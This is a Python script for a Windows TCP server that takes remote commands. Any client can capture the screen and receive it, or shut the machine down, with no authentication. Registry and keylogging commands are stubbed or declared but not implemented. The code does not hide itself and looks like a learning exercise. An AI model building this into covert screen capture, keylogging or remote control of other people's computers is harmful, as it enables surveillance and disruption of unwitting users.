import socket
import threading
import pyautogui
import io
import os
import winreg

HEADER = 64
PORT = 5050
SERVER = socket.gethostbyname(socket.gethostname())
FORMAT = 'utf-8'

DISCONNECT_MSG = "!DISCONNECT"
SCREENSHOT_MSG = "!SCREENSHOT"
SHUTDOWN_MSG = "!SHUTDOWN"
REGISTRY_MSG = "!REGISTRY"
KEYLOG_START_MSG = "!KEYLOG_START"
KEYLOG_END_MSG = "!KEYLOG_END"

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((SERVER, PORT))

def sendScreenShot(connection, address):
    print(f"[{address}] !SCREENSHOT")
    screenshot = pyautogui.screenshot()
    screenshotByteIO = io.BytesIO()
    screenshot.save(screenshotByteIO, format='PNG')
    screenshotByte = screenshotByteIO.getvalue()
    connection.send(str(len(screenshotByte)).encode('utf-8').ljust(64))
    connection.sendall(screenshotByte)

def handle_client(connection, address):
    print(f"New connection initialized - {address}.")
    while True:
        msg_len = connection.recv(HEADER).decode(FORMAT)
        if msg_len:
            msg_len = int(msg_len)
            msg = connection.recv(msg_len).decode(FORMAT)
            if msg == DISCONNECT_MSG:
                print(f"[{address}] - Connection closed")
                break
            elif msg == SCREENSHOT_MSG:
                sendScreenShot(connection, address)
            elif msg == SHUTDOWN_MSG:
                os.system("shutdown /s /t 1")
            elif msg == REGISTRY_MSG:
                pass
            else:
                print(f"[{address}] {msg}")
    print()
    connection.close()

def start():
    server.listen()
    while True:
        connection, address = server.accept()
        thread = threading.Thread(target=handle_client, args=(connection, address))
        thread.start()

print(f"[SERVER START] {socket.gethostbyname(socket.gethostname())}")
start()